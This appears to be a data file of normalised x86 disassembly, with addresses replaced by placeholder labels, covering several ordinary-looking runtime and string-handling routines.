lea eax [ ebp - 0x2c ]
push eax
call sub_1006e90e
test [ ebx + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax edi
je r-xdata
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_100578b0
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_10068b7d
mov edi eax
lea eax [ ebp - 0x48 ]
mov ebx [ ebp - 0x190 ]
push 0x7
pop edi
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x180 ] 0x3
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
mov ecx [ ebp - 0x38 ]
add edi 0x2
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x38 ] 0x1
ja r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ebx [ ebp - 0x174 ]
lea eax [ ebp - 0x128 ]
push eax
mov ecx ebx
call sub_10055b84
or [ ebp - 0x168 ] 0x1
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x174 ]
mov eax [ ebx ]
xor edi edi
mov ecx ebx
mov [ ebp - 0x17c ] edi
call [ eax + 0x1c ]
mov [ ebp - 0x184 ] eax
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push edi
push 0x30
call sub_100578b0
movzx eax ax
mov [ ebp - 0x178 ] eax
add esp 0xc
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_1000ff3d
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x70 ] edi
je r-xdata
dec eax
dec eax
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
movzx eax [ esi + 0x6 ]
mov edx [ edi ]
push eax
push 0x48
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
mov ecx esi
call sub_1001c121
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001c121
mov [ ebp - 0x16e ] 0x0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx ebx
call sub_10055b84
or [ ebp - 0x168 ] 0x2
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx ebx ax
cmp bx di
je r-xdata
mov ecx [ ebp - 0x38 ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10013990
cmp [ esi + 0x4 ] al
jne r-xdata
cmp ax [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
test [ ebp - 0x168 ] 0x1
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_10063060
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x16c ]
mov ecx esi
movzx edi ax
call sub_10069d0f
test al al
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
jae r-xdata
mov ax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x16e ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_10063060
movzx eax [ esi + 0x6 ]
mov [ ebp - 0x16e ] 0x1
cmp [ edi ] ax
je r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
test di di
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x80 ]
mov ecx esi
call sub_1005a5dc
jmp r-xdata
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp ax [ ecx ]
je r-xdata
lea ecx [ ebp - 0x2c ]
lea eax [ ebp - 0xd4 ]
push eax
mov ecx ebx
call sub_10055017
or [ ebp - 0x168 ] 0x4
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x8
jbe r-xdata
mov ecx esi
call sub_1005a5dc
lea eax [ ebp - 0x160 ]
push eax
mov ecx ebx
call sub_10055b84
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_100649e0
lea ecx [ ebp - 0x160 ]
jmp r-xdata
test [ ebp - 0x168 ] 0x2
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] edi
jge r-xdata
mov [ ebp - 0x161 ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_100405c0
push [ ebp - 0x16c ]
mov ecx esi
mov [ ebp - 0x4 ] 0xc
call sub_10069d0f
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
xor bl bl
lea eax [ ebp - 0x144 ]
push eax
mov ecx ebx
call sub_10055017
or [ ebp - 0x168 ] 0x8
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x9
jb r-xdata
push 0x0
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_10063060
jmp r-xdata
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001c121
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_1002c8c0
jmp r-xdata
sub edi [ ebp - 0x17c ]
movzx eax [ esi + 0x6 ]
cmp ax di
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x6c ] 0x10
mov edx [ ebp - 0x80 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_1001c121
test [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_10063060
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push [ ebp - 0x178 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_10046e20
dec edi
jne r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_1001c121
mov ecx esi
add edi 0x2
call sub_1005a5dc
test bl bl
je r-xdata
and [ ebp - 0x168 ] 0xfffffffb
push 0x0
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_10063060
movzx eax [ esi + 0x6 ]
cmp [ edi ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10046e20
mov ecx esi
call sub_1005a5dc
mov ecx esi
call sub_1001c121
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_10055b84
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_10063060
test edi edi
je r-xdata
mov ecx esi
call sub_1005a5dc
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_10055017
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_100649e0
push 0x0
push 0x1
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x3
call sub_10063060
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ ebp - 0x17c ]
cmp eax [ ebp - 0x184 ]
jge r-xdata
mov eax [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_1002c8c0
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001c121
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x9c ]
push eax
call sub_10055017
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_10063060
test edi edi
jne r-xdata
mov [ ebp - 0x16d ] 0x1
jmp r-xdata
test [ ebp - 0x168 ] 0x8
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x161 ] 0x1
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_1001c121
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_1001c121
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10046e20
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
inc edi
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001c121
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x161 ] 0x1
inc edi
jmp r-xdata
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10046e20
inc [ ebp - 0x17c ]
mov ecx esi
call sub_1001c121
sub_10049640
push ebp
mov ebp esp
push 0xffffffff
push sub_100861c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov esi edx
cmp edi 0x7ffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x5
cmp eax edi
jae r-xdata
push r--data
call sub_1000831a
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_100459a0
mov [ ebp - 0x4 ] 0x0
mov ebx [ esi + 0x4 ]
mov edx [ esi ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
push ecx
call sub_10044570
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov ebx eax
add esp 0x4
sub ebx ecx
test ecx ecx
je r-xdata
mov eax [ ebp - 0x14 ]
shl edi 0x5
add edi eax
and ebx 0xffffffe0
add ebx eax
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] ebx
mov [ esi ] eax
cmp ecx eax
je r-xdata
mov edx [ esi ]
push edx
call sub_100187af
add esp 0x4
mov edi edi
add ecx 0x20
cmp ecx eax
jne r-xdata
sub_1004970f
push 0xe8
mov eax sub_1008607e
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] eax
mov al [ ebp + 0x1c ]
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x90 ] al
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0xb4 ]
push eax
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1004f4bb
pop ecx
mov esi eax
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0xb4 ]
lea eax [ ebp - 0xac ]
push eax
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10026251
mov esi eax
pop ecx
mov [ ebp - 0x88 ] esi
lea ecx [ ebp - 0xac ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
sub ebx [ ebp + 0x34 ]
push 0x30
inc ebx
push ebx
push 0x0
lea ecx [ ebp + 0x24 ]
call sub_10050540
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_10034a80
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_1000ff3d
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cdq
mov ebx eax
xor ebx edx
sub ebx edx
mov [ ebp - 0x8c ] ebx
cmp [ ebp + 0x34 ] ebx
ja r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
and [ ebp - 0x1c ] 0x0
push 0xf
pop esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x2c ] 0x0
cmp [ ebp + 0x20 ] 0x0
mov edi [ ebp - 0x88 ]
mov eax [ edi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx edi
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx edi
call sub_10055b84
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx edi
call sub_10055017
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
xor bl bl
xor edx edx
xor ecx ecx
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
call sub_1006e90e
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_10021bf0
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x7
call sub_1002c8c0
push eax
lea ecx [ ebp - 0x2c ]
call sub_10021bf0
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_1002c8c0
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x64 ] 0x0
mov eax [ ebp - 0x98 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x34 ] 0x10
mov edi [ ebp - 0x48 ]
mov [ ebp - 0x84 ] al
jae r-xdata
inc edx
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x34 ]
sub esi ebx
jmp r-xdata
lea edi [ ebp - 0x48 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov bl 0x1
add edx [ ebp - 0x54 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x84 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x98 ]
cmp [ ecx + 0x24 ] 0x0
mov eax [ ecx + 0x20 ]
jl r-xdata
add edx [ ebp - 0x1c ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor edi edi
jg r-xdata
mov esi [ ebp - 0x8c ]
cmp [ ebp + 0x34 ] esi
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
and [ ebp - 0x94 ] 0x0
mov esi [ ebp - 0x88 ]
xor ebx ebx
inc ebx
cmp eax 0x100
jne r-xdata
cmp eax edx
jbe r-xdata
test eax eax
je r-xdata
xor eax eax
mov eax esi
sub eax [ ebp + 0x34 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push [ ebp - 0x84 ]
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_10050540
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x90 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x9c ] eax
call sub_100030fa
mov eax [ ebp - 0xa0 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push edi
push [ ebp - 0x90 ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10002040
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor edi edi
test bl bl
jne r-xdata
sub eax edx
mov edi eax
jmp r-xdata
xor edi edi
cmp edi esi
sbb esi esi
neg esi
add esi [ ebp + 0x34 ]
add esi eax
add edx esi
jmp r-xdata
mov edi eax
inc [ ebp - 0x94 ]
cmp [ ebp - 0x94 ] 0x4
jb r-xdata
push edi
push [ ebp - 0x90 ]
lea eax [ ebp - 0xbc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10002040
add esp 0x14
xor edi edi
cmp [ ebp - 0x50 ] 0x10
mov eax [ ebp - 0x64 ]
jae r-xdata
sub eax 0x7
je r-xdata
mov eax ecx
mov eax [ eax + 0x14 ]
and eax 0x1c0
mov [ ebp - 0xa8 ] eax
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x94 ]
movsx eax [ ebp + eax - 0x84 ]
sub eax 0x20
je r-xdata
cmp [ ebp - 0x1c ] ebx
jbe r-xdata
push [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xec ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x98 ]
push edi
push [ ebp - 0x90 ]
xor esi esi
push [ ebp + 0x10 ]
mov [ eax + 0x20 ] esi
push [ ebp + 0xc ]
mov [ eax + 0x24 ] esi
push [ ebp - 0xa4 ]
call sub_10002040
add esp 0x14
push esi
push ebx
lea ecx [ ebp - 0x64 ]
call sub_1002c8c0
push esi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
push esi
push ebx
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
push esi
push ebx
lea ecx [ ebp + 0x24 ]
call sub_1002c8c0
mov eax [ ebp - 0xa4 ]
call sub_1004642f
retn 0x38
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x8c ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ebp - 0x1c ]
inc eax
dec ecx
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xbc ]
push [ ebp + 0xc ]
push eax
call sub_100578e0
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc4 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp + 0x34 ] eax
ja r-xdata
cmp [ ebp + 0x38 ] 0x10
mov eax [ ebp + 0x24 ]
jae r-xdata
cmp [ ebp - 0xa8 ] 0x100
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x38 ] 0x10
mov eax [ ebp + 0x24 ]
jae r-xdata
push 0x30
lea ecx [ ebp + 0xc ]
call sub_100030fa
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
mov [ ebp - 0x88 ] al
push [ ebp - 0x88 ]
lea ecx [ ebp + 0xc ]
call sub_100030fa
mov eax [ ebp - 0x8c ]
sub eax [ ebp + 0x34 ]
push eax
push 0x30
push [ ebp + 0x10 ]
lea eax [ ebp - 0xdc ]
push [ ebp + 0xc ]
push eax
call sub_10002040
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x14
cmp [ ebp + 0x38 ] 0x10
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x24 ]
jae r-xdata
push [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xf4 ]
lea eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx [ ebp - 0x8c ]
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xd4 ]
push [ ebp + 0xc ]
push eax
call sub_100578e0
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ esi ]
add esp 0x14
mov ecx esi
call [ eax + 0x4 ]
mov [ ebp - 0xb0 ] al
push [ ebp - 0xb0 ]
lea ecx [ ebp + 0xc ]
call sub_100030fa
cmp [ ebp + 0x38 ] 0x10
mov ecx [ ebp + 0x24 ]
jae r-xdata
lea eax [ ebp + 0x24 ]
push [ ebp + 0x34 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xcc ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
mov eax [ ebp + 0x34 ]
sub eax [ ebp - 0x8c ]
push [ ebp - 0x8c ]
add eax ecx
push eax
lea eax [ ebp - 0xe4 ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
push eax
call sub_100578e0
add esp 0x14
jmp r-xdata
sub_10049cb7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_100821f0
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10038a17
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10038a17
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_10049da0
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0xb0
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_100404a0
mov eax esi
mov esp ebp
pop ebp
retn
sub_10049dd0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10071ca2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10049e00
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10049e41
mov edi edi
push esi
push edi
push 0x0
mov esi ecx
call sub_1002887f
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
and [ esi + 0x28 ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_100187af
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x2c ] 0x0
pop edi
pop esi
retn
mov edi [ eax ]
push eax
call sub_100187af
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_10049e85
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
